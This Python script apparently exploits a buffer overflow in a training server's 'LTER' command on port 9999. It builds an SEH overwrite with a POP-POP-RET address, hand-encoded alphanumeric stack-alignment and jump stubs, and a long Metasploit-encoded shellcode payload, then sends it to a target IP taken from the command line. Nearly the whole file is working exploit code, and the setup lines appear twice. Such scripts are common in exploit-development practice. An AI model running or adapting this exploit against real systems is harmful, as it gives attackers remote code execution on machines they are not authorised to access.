#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port
# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port


# Long Jump Shell Code Generated with https://github.com/andresroldan/Automatic-ASCII-Shellcode-Subtraction-Encoder 
JUMP_ENCODE =  b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x69\x7c\x7f\x22\x2d'                                                                      
JUMP_ENCODE += b'\x41\x78\x77\x2b\x2d\x57\x7a\x78\x21\x50\x25\x26\x2a\x4f\x3c\x25'                                                                      
JUMP_ENCODE += b'\x41\x41\x30\x42\x2d\x70\x2c\x64\x6f\x2d\x7a\x3e\x38\x6f\x2d\x2d'                                                                      
JUMP_ENCODE += b'\x3e\x71\x21\x50'

# MSF Encoded shellcode, the "buf" output can be changed with -v <KEYWORD>
buf =  b""
buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
buf += b"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
buf += b"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
buf += b"\x42\x75\x4a\x49\x79\x6c\x58\x68\x4e\x62\x57\x70"
buf += b"\x35\x50\x63\x30\x73\x50\x6c\x49\x4d\x35\x46\x51"
buf += b"\x49\x50\x32\x44\x6c\x4b\x36\x30\x46\x50\x6e\x6b"
buf += b"\x63\x62\x34\x4c\x4e\x6b\x63\x62\x52\x34\x4c\x4b"
buf += b"\x44\x32\x34\x68\x44\x4f\x6d\x67\x71\x5a\x45\x76"
buf += b"\x45\x61\x79\x6f\x4c\x6c\x55\x6c\x55\x31\x53\x4c"
buf += b"\x54\x42\x44\x6c\x47\x50\x59\x51\x48\x4f\x64\x4d"
buf += b"\x77\x71\x4a\x67\x7a\x42\x7a\x52\x51\x42\x33\x67"
buf += b"\x6e\x6b\x63\x62\x54\x50\x4e\x6b\x61\x5a\x67\x4c"
buf += b"\x6c\x4b\x72\x6c\x56\x71\x42\x58\x5a\x43\x70\x48"
buf += b"\x73\x31\x48\x51\x62\x71\x6e\x6b\x56\x39\x47\x50"
buf += b"\x66\x61\x38\x53\x4c\x4b\x43\x79\x75\x48\x69\x73"
buf += b"\x45\x6a\x63\x79\x6c\x4b\x75\x64\x6e\x6b\x43\x31"
buf += b"\x6b\x66\x76\x51\x39\x6f\x4e\x4c\x79\x51\x38\x4f"
buf += b"\x56\x6d\x57\x71\x4f\x37\x47\x48\x59\x70\x73\x45"
buf += b"\x4a\x56\x54\x43\x51\x6d\x4c\x38\x45\x6b\x61\x6d"
buf += b"\x61\x34\x62\x55\x6b\x54\x33\x68\x4c\x4b\x66\x38"
buf += b"\x66\x44\x36\x61\x6b\x63\x63\x56\x6c\x4b\x36\x6c"
buf += b"\x32\x6b\x6e\x6b\x50\x58\x57\x6c\x56\x61\x68\x53"
buf += b"\x6e\x6b\x37\x74\x6e\x6b\x65\x51\x68\x50\x6d\x59"
buf += b"\x47\x34\x55\x74\x54\x64\x71\x4b\x61\x4b\x55\x31"
buf += b"\x32\x79\x73\x6a\x73\x61\x49\x6f\x49\x70\x33\x6f"
buf += b"\x31\x4f\x43\x6a\x4c\x4b\x42\x32\x48\x6b\x6e\x6d"
buf += b"\x51\x4d\x32\x48\x55\x63\x34\x72\x35\x50\x65\x50"
buf += b"\x35\x38\x30\x77\x31\x63\x37\x42\x51\x4f\x61\x44"
buf += b"\x63\x58\x52\x6c\x42\x57\x47\x56\x57\x77\x39\x6f"
buf += b"\x4a\x75\x4e\x58\x4a\x30\x57\x71\x37\x70\x75\x50"
buf += b"\x67\x59\x59\x54\x66\x34\x32\x70\x73\x58\x71\x39"
buf += b"\x4f\x70\x32\x4b\x77\x70\x59\x6f\x39\x45\x36\x30"
buf += b"\x72\x70\x30\x50\x72\x70\x37\x30\x62\x70\x57\x30"
buf += b"\x72\x70\x30\x68\x49\x7a\x36\x6f\x79\x4f\x4d\x30"
buf += b"\x49\x6f\x79\x45\x4a\x37\x50\x6a\x76\x65\x52\x48"
buf += b"\x44\x4a\x73\x30\x46\x62\x46\x6f\x63\x58\x56\x62"
buf += b"\x57\x70\x65\x4f\x6a\x30\x4f\x79\x48\x66\x63\x5a"
buf += b"\x44\x50\x76\x36\x73\x67\x62\x48\x4f\x69\x79\x35"
buf += b"\x71\x64\x71\x71\x39\x6f\x59\x45\x4e\x65\x79\x50"
buf += b"\x53\x44\x74\x4c\x6b\x4f\x50\x4e\x64\x48\x44\x35"
buf += b"\x48\x6c\x65\x38\x7a\x50\x4f\x45\x79\x32\x71\x46"
buf += b"\x39\x6f\x5a\x75\x70\x68\x31\x73\x42\x4d\x30\x64"
buf += b"\x33\x30\x6f\x79\x6a\x43\x33\x67\x32\x77\x53\x67"
buf += b"\x35\x61\x6b\x46\x33\x5a\x52\x32\x50\x59\x70\x56"
buf += b"\x4b\x52\x59\x6d\x73\x56\x6f\x37\x43\x74\x46\x44"
buf += b"\x37\x4c\x76\x61\x67\x71\x4c\x4d\x62\x64\x51\x34"
buf += b"\x42\x30\x79\x56\x67\x70\x62\x64\x63\x64\x30\x50"
buf += b"\x70\x56\x46\x36\x50\x56\x42\x66\x51\x46\x52\x6e"
buf += b"\x32\x76\x66\x36\x76\x33\x36\x36\x42\x48\x74\x39"
buf += b"\x6a\x6c\x67\x4f\x4d\x56\x4b\x4f\x6a\x75\x4d\x59"
buf += b"\x39\x70\x42\x6e\x63\x66\x42\x66\x49\x6f\x34\x70"
buf += b"\x30\x68\x35\x58\x6c\x47\x75\x4d\x61\x70\x69\x6f"
buf += b"\x49\x45\x4d\x6b\x58\x70\x4f\x45\x69\x32\x50\x56"
buf += b"\x42\x48\x69\x36\x4d\x45\x6f\x4d\x4f\x6d\x6b\x4f"
buf += b"\x69\x45\x77\x4c\x33\x36\x43\x4c\x67\x7a\x4d\x50"
buf += b"\x39\x6b\x69\x70\x50\x75\x35\x55\x6d\x6b\x70\x47"
buf += b"\x65\x43\x71\x62\x32\x4f\x51\x7a\x43\x30\x72\x73"
buf += b"\x6b\x4f\x79\x45\x41\x41"

# Generate a payload the server expects: Command followed by Data
PAYLOAD = (
    b'LTER .' +
    # Padding in the event we do not jump perfectly to the start of the array.
    # We use 'A' since the NOP command `0x90` is a bad character!
    b'A' * 16 + 
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x2d\x69\x03' +       # SUB AX,0x0369
    b'\x66\x2d\x69\x03' +       # SUB AX,0x0369
    b'\x66\x2d\x69\x03' +       # SUB AX,0x0369
    b'\x66\x2d\x46\x03' +       # SUB AX,0x0345
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    buf + 
    b'A' * (3506 - (16 + 20 + 79 + 4 + len(buf))) +
    # Align stack for long jump
    b'\x54' +           # PUSH ESP
    b'\x58' +           # POP EAX
    b'\x2c\x30' +       # SUB AL,30
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    JUMP_ENCODE +
    b'A' * (79 - (6 + len(JUMP_ENCODE))) +   # Fill the rest of our buffer with A
    # JNZ SHORT +0x10: Will jump if ZF is 0
    b'\x75\x08' +
    # JZ SHORT +0x8: This will only happen if the previous jump did not happen and ZF is 1
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250184E) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x1f\x12' +       # ADD AX,0x097F
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    b'\x25\x4a\x4d\x4e\x55' +   # AND EAX,0x554E4D4A
    b'\x25\x35\x32\x31\x2a' +   # AND EAX,0x2A313235
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075 
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (5000 - (3506 + 4 + 2 + 8))
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)